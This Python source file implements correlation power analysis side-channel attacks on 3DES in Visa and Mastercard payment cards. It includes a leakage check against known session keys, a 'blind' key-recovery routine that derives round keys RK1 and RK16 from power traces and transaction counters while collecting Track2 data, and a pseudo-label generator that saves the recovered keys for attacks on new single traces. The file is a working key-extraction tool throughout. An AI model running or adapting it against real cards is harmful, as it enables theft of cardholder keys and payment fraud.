
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import os
import json
from tqdm import tqdm
from src.crypto import des_sbox_output, hamming_weight, generate_round_keys
from src.utils import setup_logger

logger = setup_logger("cpa_attack")

# Cipher Tables
# Initial Permutation (IP)
IP_TABLE = [
    57, 49, 41, 33, 25, 17, 9, 1,
    59, 51, 43, 35, 27, 19, 11, 3,
    61, 53, 45, 37, 29, 21, 13, 5,
    63, 55, 47, 39, 31, 23, 15, 7,
    56, 48, 40, 32, 24, 16, 8, 0,
    58, 50, 42, 34, 26, 18, 10, 2,
    60, 52, 44, 36, 28, 20, 12, 4,
    62, 54, 46, 38, 30, 22, 14, 6
]
IP_TABLE = [x - 1 for x in IP_TABLE] # 0-based

# Expansion Permutation (E)
E_TABLE = [
    32, 1, 2, 3, 4, 5,
    4, 5, 6, 7, 8, 9,
    8, 9, 10, 11, 12, 13,
    12, 13, 14, 15, 16, 17,
    16, 17, 18, 19, 20, 21,
    20, 21, 22, 23, 24, 25,
    24, 25, 26, 27, 28, 29,
    28, 29, 30, 31, 32, 1
]
E_TABLE = [x - 1 for x in E_TABLE]

def run_cpa_attack():
    # 1. Load Traces and Metadata
    logger.info("Loading Traces (Mastercard)...")
    try:
        traces = np.load("Processed/Mastercard/X_features.npy")
        df = pd.read_csv("Processed/Mastercard/Y_meta.csv")
    except FileNotFoundError as e:
        logger.error(f"Cannot load data: {e}")
        return

    # Check alignment
    if len(traces) != len(df):
        logger.warning(f"Mismatch: Traces {len(traces)} vs Metadata {len(df)}")
        n = min(len(traces), len(df))
        traces = traces[:n]
        df = df.iloc[:n]

    logger.info(f"Loaded {len(traces)} traces.")

    # 2. Extract Challenges (Plaintext) from ATC columns
    pt_cols = [f'ATC_{i}' for i in range(8)]
    if not all(c in df.columns for c in pt_cols):
        logger.error("Missing ATC columns.")
        return
    plaintexts = df[pt_cols].values.astype(np.uint8) 

    # 3. Extract Session Keys from CSV
    if 'T_DES_KENC' not in df.columns:
        logger.error("Missing T_DES_KENC column.")
        return
    
    # Helper to clean key string
    def clean_key(k):
        k = str(k).strip().replace(" ", "").upper()
        # Just return first 16 chars (8 bytes) for DES R1
        return k[:16]

    keys_hex = df['T_DES_KENC'].apply(clean_key).values
    
    # 4. Compute Round Keys for every trace
    logger.info("Generating Round Keys for all traces...")
    
    rk1_chunks_all = [] # (N, 8)
    
    for k_hex in tqdm(keys_hex, desc="Generating Keys"):
        try:
            kb = bytes.fromhex(k_hex)
            # This returns list of 48-bit integers
            rks = generate_round_keys(kb) 
            rk1 = rks[0] # Round 1 key (48-bit int)
            
            # Extract 8 chunks (6 bits each)
            chunks = []
            for i in range(8):
                # S1 is top 6 bits (MSB)
                shift = 42 - (i * 6)
                val = (rk1 >> shift) & 0x3F
                chunks.append(val)
            rk1_chunks_all.append(chunks)
        except Exception as e:
            # logger.warning(f"Key error: {e}")
            rk1_chunks_all.append([0]*8)
            
    rk1_chunks_all = np.array(rk1_chunks_all, dtype=np.uint8)
    
    # 5. Compute Input to S-Boxes (Plaintext Expansion)
    logger.info("Computing S-Box Inputs...")
    pt_bits = np.unpackbits(plaintexts, axis=1) # (N, 64)
    pt_ip = pt_bits[:, IP_TABLE]
    r0 = pt_ip[:, 32:64] # Right Half (32 bits)
    r0_expanded = r0[:, E_TABLE] # (N, 48)
    
    # Pack expanded bits into 8 chunks of 6 bits
    r0_chunks = np.zeros((len(traces), 8), dtype=np.uint8)
    for sbox_idx in range(8):
        bits_slice = r0_expanded[:, sbox_idx*6 : (sbox_idx+1)*6]
        # packbits logic
        val = np.zeros(len(traces), dtype=np.uint8)
        for i in range(6):
            val = (val << 1) | bits_slice[:, i]
        r0_chunks[:, sbox_idx] = val

    # 6. CPA Correlation Loop
    logger.info("Computing Correlations...")
    
    # Standardize traces
    traces = traces - np.mean(traces, axis=0) # (N, T)
    t_sq = np.sum(traces ** 2, axis=0)
    
    results = []
    
    for sbox_idx in range(8):
        # Calculate Hypothesis: HW( SBox( R0_chunk ^ RK1_chunk ) )
        # Using vectorized true values (verification mode)
        
        # Inputs
        inp = r0_chunks[:, sbox_idx]
        key = rk1_chunks_all[:, sbox_idx]
        
        xor_val = inp ^ key
        
        # S-Box Lookup
        sbox_lut = np.array([des_sbox_output(sbox_idx, x) for x in range(64)], dtype=np.uint8)
        sbox_out = sbox_lut[xor_val]
        
        # Hamming Weight
        hw_lut = np.array([bin(x).count('1') for x in range(16)], dtype=np.uint8)
        model = hw_lut[sbox_out] # (N,)
        
        # Correlate Model vs Traces
        h_mean = np.mean(model)
        h_centered = model - h_mean
        h_sq = np.sum(h_centered ** 2)
        
        # Covariance
        cov = np.dot(h_centered, traces)
        
        # Correlation
        den = np.sqrt(t_sq * h_sq)
        den[den == 0] = 1.0
        
        corrs = np.abs(cov / den)
        
        max_corr = np.max(corrs)
        sample_idx = np.argmax(corrs)
        
        results.append({
            "SBox": int(sbox_idx + 1),
            "Max_Corr": float(max_corr),
            "Sample_Idx": int(sample_idx)
        })
        
        logger.info(f"S-Box {sbox_idx+1}: Peak Corr = {max_corr:.4f} @ {sample_idx}")

    # 7. Summary
    logger.info("=== Leakage Verification Summary ===")
    avg_corr = np.mean([r["Max_Corr"] for r in results])
    logger.info(f"Average Peak Correlation: {avg_corr:.4f}")
    
    if avg_corr > 0.05:
        logger.info("✅ SUCCESS: Leakage detected matching the Session Keys.")
    else:
        logger.warning("❌ WARNING: No significant leakage found. Check alignment, keys or power model.")

    with open("cpa_validation_results.json", "w") as f:
        json.dump(results, f, indent=4)
        
if __name__ == "__main__":
    run_cpa_attack()


# ---------------------------------------------------------------------------
# Blind CPA Key Recovery (no trained models or ground-truth keys required)
# ---------------------------------------------------------------------------

def _parse_atc_to_bytes(atc_str: str) -> bytes:
    """Parse ATC like '02 5B' (up to 16 hex nibbles) to 8-byte block, zero-padded."""
    s = str(atc_str).replace(" ", "").strip().upper()
    if not s or s == "NAN":
        return b"\x00" * 8
    s = s.zfill(16)[:16]
    try:
        return bytes.fromhex(s)
    except ValueError:
        return b"\x00" * 8


def run_cpa_blind_recovery(
    input_dir: str,
    processed_dir: str,
    output_dir: str,
    card_type: str = "visa",
    n_traces_max: int = 0,
) -> dict:
    """
    Fully blind Correlation Power Analysis (CPA) key recovery for 3DES traces.
    No ground-truth keys, APDU responses, or prior trained models are required.

    Requirements per CSV file
    -------------------------
    - ``trace_data``  column : comma-separated float power samples
    - ``ATC``         column : hex Application Transaction Counter (plaintext proxy)
    - ``Track2``      column : optional, used in output metadata
    - ``UN``          column : optional, stored in metadata

    Attack strategy
    ---------------
    * Stage 1 — Pearson CPA on the first 1/3 of trace samples
                -> recovers RK1  (Round Key 1)  of K1.
    * Stage 2 — Pearson CPA on the middle 1/3 of trace samples
                -> recovers RK16 (Round Key 16) of K2, which is the first sub-key
                  applied during K2's decryption pass in 3DES.
    * 8 PC2-ambiguous bits remain per key half (256 candidates each).
      ``candidates[0]`` (zeros for unknown bits) is returned as the default guess.
    * Full 3DES key is returned as K1 || K2 (32 hex chars = 16 bytes).

    Parameters
    ----------
    input_dir     : Directory (searched recursively) containing the CSV trace files.
    processed_dir : Destination for ``Y_meta.csv`` (required by report generation).
    output_dir    : Destination for ``cpa_result.json`` (detailed recovery summary).
    card_type     : Profile label stored in the JSON summary (e.g. ``'visa'``).
    n_traces_max  : Maximum traces to load (0 = load all).

    Returns
    -------
    dict with keys: ``3DES_KENC`` (list[str] x N), ``3DES_KMAC``, ``3DES_KDEK``,
    ``cpa_k1``, ``cpa_k2``, ``cpa_k1_candidates``, ``cpa_k2_candidates``, ``n_traces``.
    """
    import glob
    from src.crypto import (
        generate_key_candidates_from_rk1,
        generate_key_candidates_from_rk16,
        IP as _IP_SRC,       # correct DES IP: first 32 outputs = L0, last 32 = R0
        E_TABLE as _E_SRC,   # correct E-expansion table (0-indexed into R0)
    )

    # ------------------------------------------------------------------
    # 1. Load CSV trace files
    # ------------------------------------------------------------------
    csv_files = sorted(glob.glob(os.path.join(input_dir, "**", "*.csv"), recursive=True))
    if not csv_files:
        raise FileNotFoundError(f"No CSV files found under {input_dir}")
    logger.info("[CPA] Loading traces from %d CSV file(s) ...", len(csv_files))

    all_traces: list = []
    all_atc:    list = []
    all_track2: list = []
    all_un:     list = []

    for fpath in csv_files:
        df_f = pd.read_csv(fpath)
        if "trace_data" not in df_f.columns or "ATC" not in df_f.columns:
            logger.warning("[CPA] Skipping %s: missing trace_data/ATC", os.path.basename(fpath))
            continue
        if n_traces_max > 0:
            remaining = n_traces_max - len(all_traces)
            if remaining <= 0:
                break
            df_f = df_f.head(remaining)

        for row_str in df_f["trace_data"].values:
            t = np.fromstring(str(row_str), dtype=np.float32, sep=",")
            all_traces.append(t)

        all_atc.extend(df_f["ATC"].astype(str).tolist())
        all_track2.extend(df_f["Track2"].astype(str).tolist() if "Track2" in df_f.columns else [""] * len(df_f))
        all_un.extend(df_f["UN"].astype(str).tolist() if "UN" in df_f.columns else [""] * len(df_f))
        logger.info("[CPA]   %s -> %d traces", os.path.basename(fpath), len(df_f))

    N = len(all_traces)
    if N == 0:
        raise ValueError("No valid traces could be loaded from input_dir CSV files")

    T = min(len(t) for t in all_traces)
    traces = np.stack([t[:T] for t in all_traces], axis=0).astype(np.float32)  # (N, T)
    logger.info("[CPA] Dataset: N=%d traces x T=%d samples/trace", N, T)

    # ------------------------------------------------------------------
    # 2. Save Y_meta.csv for downstream report generation
    # ------------------------------------------------------------------
    os.makedirs(processed_dir, exist_ok=True)
    meta_df = pd.DataFrame({"Track2": all_track2, "ATC": all_atc, "UN": all_un})
    meta_path = os.path.join(processed_dir, "Y_meta.csv")
    meta_df.to_csv(meta_path, index=False)
    logger.info("[CPA] Metadata saved: %s", meta_path)

    # ------------------------------------------------------------------
    # 3. ATC -> 8-byte plaintext -> IP -> R0 -> E-expansion -> 6-bit chunks
    # IP_TABLE and E_TABLE are defined at module level (0-based indices)
    # ------------------------------------------------------------------
    plaintexts = np.array(
        [list(_parse_atc_to_bytes(a)) for a in all_atc], dtype=np.uint8
    )  # (N, 8)
    pt_bits = np.unpackbits(plaintexts, axis=1)   # (N, 64)
    # Use src.crypto's IP (standard DES order: positions 0-31 = L0, 32-63 = R0).
    # cpa_attack.py's module-level IP_TABLE has L0/R0 swapped, so we import correctly.
    _IP  = np.array(_IP_SRC, dtype=np.intp)
    _ET  = np.array(_E_SRC,  dtype=np.intp)
    pt_ip   = pt_bits[:, _IP]                     # (N, 64) IP-permuted bits
    r0      = pt_ip[:, 32:]                       # (N, 32) R0 — right half after IP
    r0_exp  = r0[:, _ET]                          # (N, 48) after E-expansion

    p_chunks = np.zeros((N, 8), dtype=np.uint8)   # 6-bit S-box input per S-box
    for sb in range(8):
        bits_sb = r0_exp[:, sb * 6: (sb + 1) * 6]  # (N, 6)
        val = np.zeros(N, dtype=np.uint8)
        for b in range(6):
            val = (val << 1) | bits_sb[:, b].astype(np.uint8)
        p_chunks[:, sb] = val

    # ------------------------------------------------------------------
    # 4. Precompute HW(SBox[s](x)) for all 8 S-boxes x 64 input values
    # ------------------------------------------------------------------
    hw_sbox = np.zeros((8, 64), dtype=np.float32)
    for sb in range(8):
        for x in range(64):
            out = des_sbox_output(sb, x)          # 4-bit output (0-15)
            hw_sbox[sb, x] = bin(out).count("1")

    # ------------------------------------------------------------------
    # 5. Vectorised Pearson CPA over a time window
    # ------------------------------------------------------------------
    def _cpa_window(t_win: np.ndarray) -> np.ndarray:
        """
        t_win : (N, W) float32 — trace samples for the window.
        Returns : (8,) uint8  — best 6-bit RK chunk per S-box.
        """
        t_c  = t_win - t_win.mean(axis=0)          # column-centred (N, W)
        t_sq = np.sum(t_c ** 2, axis=0)            # (W,) variance denominator

        recovered = np.zeros(8, dtype=np.uint8)
        for sb in range(8):
            best_k, best_corr = 0, -1.0
            for k_guess in range(64):
                xor_v  = p_chunks[:, sb] ^ np.uint8(k_guess)   # (N,)
                hw_m   = hw_sbox[sb, xor_v]                     # (N,) float32
                h_c    = hw_m - hw_m.mean()                     # (N,) centred
                h_sq   = float(np.dot(h_c, h_c))
                if h_sq < 1e-10:
                    continue
                cov   = h_c @ t_c                               # (W,) vectorised
                denom = np.sqrt(t_sq * h_sq)
                denom[denom < 1e-10] = 1e-10
                peak  = float(np.max(np.abs(cov / denom)))
                if peak > best_corr:
                    best_corr = peak
                    best_k    = k_guess

            recovered[sb] = best_k
            logger.info(
                "[CPA]     S-box %d -> k=0x%02X (%2d)  peak_corr=%.4f",
                sb + 1, best_k, best_k, best_corr,
            )
        return recovered

    # ------------------------------------------------------------------
    # 6. Stage 1: first third of trace -> RK1 -> K1
    # ------------------------------------------------------------------
    T_s1 = T // 3
    logger.info("[CPA] Stage 1 (samples 0 .. %d) -> RK1 of K1 ...", T_s1)
    rk1_chunks = _cpa_window(traces[:, :T_s1])

    # ------------------------------------------------------------------
    # 7. Stage 2: middle third of trace -> RK16 -> K2
    # ------------------------------------------------------------------
    T_s2_a, T_s2_b = T // 3, (2 * T) // 3
    logger.info("[CPA] Stage 2 (samples %d .. %d) -> RK16 of K2 ...", T_s2_a, T_s2_b)
    rk16_chunks = _cpa_window(traces[:, T_s2_a:T_s2_b])

    # ------------------------------------------------------------------
    # 8. Reconstruct candidate keys (256 per key half due to PC2 ambiguity)
    # ------------------------------------------------------------------
    k1_candidates  = generate_key_candidates_from_rk1([int(x) for x in rk1_chunks])
    k2_candidates  = generate_key_candidates_from_rk16([int(x) for x in rk16_chunks])

    # Without T_DES_* ground truth, candidates[0] uses zeros for the 8 unknown bits.
    k1_hex       = f"{k1_candidates[0]:016X}"
    k2_hex       = f"{k2_candidates[0]:016X}"
    full_key_hex = k1_hex + k2_hex              # K1 || K2, 32 hex chars

    logger.info("[CPA] Recovered K1 (48 of 56 bits confirmed): %s", k1_hex)
    logger.info("[CPA] Recovered K2 (48 of 56 bits confirmed): %s", k2_hex)
    logger.info("[CPA] 3DES key K1||K2: %s", full_key_hex)
    logger.info(
        "[CPA] %d K1 candidates / %d K2 candidates (8 PC2-ambiguous bits per half)",
        len(k1_candidates), len(k2_candidates),
    )

    # ------------------------------------------------------------------
    # 9. Persist detailed JSON summary
    # ------------------------------------------------------------------
    os.makedirs(output_dir, exist_ok=True)
    summary = {
        "method":               "Pearson_CPA",
        "card_type":            card_type,
        "n_traces":             N,
        "trace_samples":        T,
        "K1_default":           k1_hex,
        "K2_default":           k2_hex,
        "full_key_K1K2_default": full_key_hex,
        "rk1_chunks":           [f"0x{int(x):02X}" for x in rk1_chunks],
        "rk16_chunks":          [f"0x{int(x):02X}" for x in rk16_chunks],
        "n_k1_candidates":      len(k1_candidates),
        "n_k2_candidates":      len(k2_candidates),
        "k1_candidates_top10":  [f"{c:016X}" for c in k1_candidates[:10]],
        "k2_candidates_top10":  [f"{c:016X}" for c in k2_candidates[:10]],
        "pc2_note": (
            "8 bits per key half are PC2-ambiguous and cannot be resolved by CPA alone. "
            "Provide T_DES_* ground truth or an APDU Application Cryptogram to select "
            "the correct candidate from the 256 available."
        ),
    }
    result_path = os.path.join(output_dir, "cpa_result.json")
    with open(result_path, "w") as f:
        json.dump(summary, f, indent=2)
    logger.info("[CPA] Summary written to %s", result_path)

    return {
        "3DES_KENC": [full_key_hex] * N,
        "3DES_KMAC": [""] * N,
        "3DES_KDEK": [""] * N,
        "cpa_k1":            k1_hex,
        "cpa_k2":            k2_hex,
        "cpa_k1_candidates": k1_candidates,
        "cpa_k2_candidates": k2_candidates,
        "n_traces":          N,
    }


# ---------------------------------------------------------------------------
# CPA Pseudo-Label Generator — for unsupervised Visa training pipeline
# ---------------------------------------------------------------------------

def generate_cpa_external_label_map(
    input_dir: str,
    processed_dir: str,
    card_type: str = "visa",
    n_cpa_traces: int = 3000,
    model_root: str = "",
) -> dict:
    """
    Run CPA on a batch of blind traces (no keys required) and return an
    ``external_label_map`` dict that can be passed directly to
    ``perform_feature_extraction`` / ``TraceDataset`` so that the standard
    supervised training pipeline generates correct S-box labels.

    The function also saves ``cpa_keys.json`` to both ``processed_dir`` and
    (when ``model_root`` is given) ``model_root``, so that the inference step
    can resolve the 8 PC2-ambiguous bits at attack time without accessing any
    ground-truth columns.

    Parameters
    ----------
    input_dir     : Directory with CSV trace files (trace_data + ATC required).
    processed_dir : Where ``cpa_keys.json`` is written (created if needed).
    card_type     : ``'visa'``, ``'mastercard'``, or ``'universal'``.
    n_cpa_traces  : Maximum traces to load for the CPA step (3000 is sufficient
                    for most setups; 0 = use all available).
    model_root    : Optional; also copies ``cpa_keys.json`` here for later use
                    by inference runs against new single traces.

    Returns
    -------
    dict  :  ``{ "<card_type>|ANY" : {"T_DES_KENC": hex32, "T_DES_KMAC": hex32,
                                       "T_DES_KDEK": hex32} }``
             suitable for passing as ``cpa_label_map`` to ``preprocess_3des``.
    """
    import glob
    from src.crypto import (
        generate_key_candidates_from_rk1,
        generate_key_candidates_from_rk16,
        IP as _IP_SRC,
        E_TABLE as _E_SRC,
    )

    # ------------------------------------------------------------------ 1. load
    csv_files = sorted(glob.glob(os.path.join(input_dir, "**", "*.csv"), recursive=True))
    if not csv_files:
        raise FileNotFoundError(f"No CSV files under {input_dir}")

    all_traces: list = []
    all_atc:    list = []
    limit = n_cpa_traces if n_cpa_traces > 0 else int(1e9)
    for fpath in csv_files:
        if len(all_traces) >= limit:
            break
        df_f = pd.read_csv(fpath)
        if "trace_data" not in df_f.columns or "ATC" not in df_f.columns:
            continue
        need = limit - len(all_traces)
        df_f = df_f.head(need)
        for row_str in df_f["trace_data"].values:
            all_traces.append(np.fromstring(str(row_str), dtype=np.float32, sep=","))
        all_atc.extend(df_f["ATC"].astype(str).tolist())

    N = len(all_traces)
    if N == 0:
        raise ValueError("No valid traces loaded from input_dir CSV files")

    T = min(len(t) for t in all_traces)
    traces = np.stack([t[:T] for t in all_traces], axis=0).astype(np.float32)
    logger.info("[CPA-LABEL] Using %d traces x %d samples for pseudo-label CPA", N, T)

    # ------------------------------------------------------------------ 2. ATC -> E-expanded R0 chunks
    _IP  = np.array(_IP_SRC,  dtype=np.intp)
    _ET  = np.array(_E_SRC,   dtype=np.intp)
    plaintexts = np.array([list(_parse_atc_to_bytes(a)) for a in all_atc], dtype=np.uint8)
    pt_bits    = np.unpackbits(plaintexts, axis=1)
    pt_ip      = pt_bits[:, _IP]
    r0         = pt_ip[:, 32:]
    r0_exp     = r0[:, _ET]
    p_chunks   = np.zeros((N, 8), dtype=np.uint8)
    for sb in range(8):
        bits_sb = r0_exp[:, sb * 6:(sb + 1) * 6]
        val     = np.zeros(N, dtype=np.uint8)
        for b in range(6):
            val = (val << 1) | bits_sb[:, b].astype(np.uint8)
        p_chunks[:, sb] = val

    # ------------------------------------------------------------------ 3. HW table
    hw_sbox = np.zeros((8, 64), dtype=np.float32)
    for sb in range(8):
        for x in range(64):
            hw_sbox[sb, x] = bin(des_sbox_output(sb, x)).count("1")

    # ------------------------------------------------------------------ 4. Pearson CPA (vectorised)
    def _cpa_best_chunks(t_win: np.ndarray) -> np.ndarray:
        t_c  = t_win - t_win.mean(axis=0)
        t_sq = np.sum(t_c ** 2, axis=0)
        recovered = np.zeros(8, dtype=np.uint8)
        for sb in range(8):
            best_k, best_corr = 0, -1.0
            for k_guess in range(64):
                xor_v = p_chunks[:, sb] ^ np.uint8(k_guess)
                hw_m  = hw_sbox[sb, xor_v]
                h_c   = hw_m - hw_m.mean()
                h_sq  = float(np.dot(h_c, h_c))
                if h_sq < 1e-10:
                    continue
                cov  = h_c @ t_c
                denom = np.sqrt(t_sq * h_sq)
                denom[denom < 1e-10] = 1e-10
                peak = float(np.max(np.abs(cov / denom)))
                if peak > best_corr:
                    best_corr = peak
                    best_k    = k_guess
            recovered[sb] = best_k
        return recovered

    T_s1 = T // 3
    T_s2_a, T_s2_b = T // 3, (2 * T) // 3
    logger.info("[CPA-LABEL] Stage 1 (0..%d) ...", T_s1)
    rk1_chunks  = _cpa_best_chunks(traces[:, :T_s1])
    logger.info("[CPA-LABEL] Stage 2 (%d..%d) ...", T_s2_a, T_s2_b)
    rk16_chunks = _cpa_best_chunks(traces[:, T_s2_a:T_s2_b])

    # ------------------------------------------------------------------ 5. Reconstruct keys
    k1_candidates  = generate_key_candidates_from_rk1([int(x) for x in rk1_chunks])
    k2_candidates  = generate_key_candidates_from_rk16([int(x) for x in rk16_chunks])
    k1_hex       = f"{k1_candidates[0]:016X}"
    k2_hex       = f"{k2_candidates[0]:016X}"
    full_key_hex = k1_hex + k2_hex
    logger.info("[CPA-LABEL] CPA pseudo-key K1||K2: %s", full_key_hex)

    # ------------------------------------------------------------------ 6. Save cpa_keys.json
    # The same key is stored as KENC/KMAC/KDEK because we cannot distinguish the
    # three 3DES key slots via CPA alone (they differ only by the card master key
    # schedule, not by their S-box leakage signatures).
    cpa_record = {
        "card_type":   card_type,
        "T_DES_KENC":  full_key_hex,
        "T_DES_KMAC":  full_key_hex,
        "T_DES_KDEK":  full_key_hex,
        "K1":          k1_hex,
        "K2":          k2_hex,
        "rk1_chunks":  [f"0x{int(x):02X}" for x in rk1_chunks],
        "rk16_chunks": [f"0x{int(x):02X}" for x in rk16_chunks],
        "n_cpa_traces": N,
        "label_map_key": f"{card_type.lower()}|ANY",
        "pc2_note": (
            "8 bits per key half are PC2-ambiguous.  candidates[0] (zero-default) "
            "is used, giving a consistent answer for this card batch even though the "
            "physical chip key may differ in those 8 bits."
        ),
    }
    os.makedirs(processed_dir, exist_ok=True)
    keys_path = os.path.join(processed_dir, "cpa_keys.json")
    with open(keys_path, "w") as f:
        json.dump(cpa_record, f, indent=2)
    logger.info("[CPA-LABEL] cpa_keys.json -> %s", keys_path)

    if model_root:
        os.makedirs(model_root, exist_ok=True)
        mr_path = os.path.join(model_root, "cpa_keys.json")
        with open(mr_path, "w") as f:
            json.dump(cpa_record, f, indent=2)
        logger.info("[CPA-LABEL] cpa_keys.json -> %s (model root copy)", mr_path)

    # ------------------------------------------------------------------ 7. Return external_label_map
    map_key = f"{card_type.lower()}|ANY"
    label_entry = {"T_DES_KENC": full_key_hex, "T_DES_KMAC": full_key_hex, "T_DES_KDEK": full_key_hex}
    return {map_key: label_entry}

